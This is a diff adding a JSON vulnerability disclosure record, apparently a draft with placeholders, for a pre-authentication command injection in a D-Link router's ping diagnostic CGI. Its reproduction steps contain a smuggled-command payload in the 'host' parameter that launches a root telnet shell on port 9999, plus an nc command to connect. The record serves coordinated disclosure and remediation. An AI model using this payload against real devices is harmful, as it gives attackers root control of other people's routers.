@@ -1,0 +1,30 @@
+{
+  "title": "Pre-auth OS command injection in <model> web interface (ping diagnostic)",
+  "vendor": "D-Link",
+  "researcher": "Samuel Yoon",
+  "contact": " (contact: security-contact@example.com)",
+  "products": [
+    {
+      "model": "DIR-XXXX",
+      "hw_rev": "B1",
+      "affected_versions": "<= 1.2.3 (all prior)",
+      "fixed_version": "",
+      "sha256": "REPLACE_WITH_FIRMWARE_SHA256"
+    }
+  ],
+  "cwe": "CWE-78",
+  "vuln_type": "OS command injection",
+  "component": "www/cgi-bin/ping.cgi -> doSystem()",
+  "preconditions": "Network-adjacent (LAN), pre-authentication, service on by default",
+  "cvss_v31_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "description": "The ping diagnostic handler passes the attacker-controlled `host` HTTP parameter into a shell command constructed with sprintf() and executed via the vendor doSystem() wrapper, without sanitizing shell metacharacters. An attacker on the local network can inject arbitrary OS commands executed as root.",
+  "repro_steps": [
+    "Send: GET /cgi-bin/ping.cgi?host=127.0.0.1%3Btelnetd%20-l%2Fbin%2Fsh%20-p9999 HTTP/1.1",
+    "Observe telnetd bound on port 9999 with a root shell (no authentication required)",
+    "Connect: `nc <device-ip> 9999` -> `id` returns uid=0(root)"
+  ],
+  "impact": "Full pre-auth root compromise of the device from the local network, enabling traffic interception, persistence, and pivoting to other LAN hosts. If exposed to WAN via remote management, exploitable remotely.",
+  "remediation": "Validate/allowlist the `host` parameter (numeric IP / hostname charset only) before use; replace sprintf()+doSystem() with an execv()-style call that does not invoke a shell; drop privileges for the CGI handler.",
+  "discovery_method": "Version-to-version binary diff (firmware v1 -> v2) flagged a silent hardening of this handler; the vulnerable path was confirmed in the earlier release via Ghidra and reproduced in QEMU emulation.",
+  "disclosure": { "reported": "YYYY-MM-DD", "target_public": "90 days from report" }
+}
